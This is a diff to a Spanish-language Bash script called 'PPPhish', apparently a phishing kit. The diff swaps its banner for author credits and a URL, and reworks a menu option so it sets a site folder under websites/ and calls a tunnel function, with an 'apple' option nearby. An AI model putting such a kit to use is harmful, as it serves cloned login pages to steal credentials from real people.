@@ -20,12 +20,12 @@ bcolor="\e[1;3$crnd$s"
 a2(){
 
 echo -e 
-"__________ __________ __________ .__     .__         .__     
-\______   \\______   \\______   \|  |__  |__|  ______|  |__  
- |     ___/ |     ___/ |     ___/|  |  \ |  | /  ___/|  |  \ 
- |    |     |    |     |    |    |   Y  \|  | \___ \ |   Y  \
- |____|     |____|     |____|    |___|  /|__|/____  >|___|  /
-                                      \/          \/      \/ "
+"PPPhish
+Created by Piter
+Creditos: DeepSociety
+Puedes enviar Emails: http://bypiterrecoursesinformaticos.ibx.lat
+
+"
 
 }
 
@@ -136,7 +136,9 @@ read -p $'\e[1;33m[\e[1;39m*\e[1;33m]\e[1;92m Elige una opción\e[1;39m > ' opc
 echo
 if [[ $opc == "1" || $opc == "01" ]];then
 web="chica"
-go
+op="ingles"
+ruta_carpeta="websites/$web"
+tunnel
 
 elif [[ $opc == "4" || $opc == "04" ]];then
 web="apple"
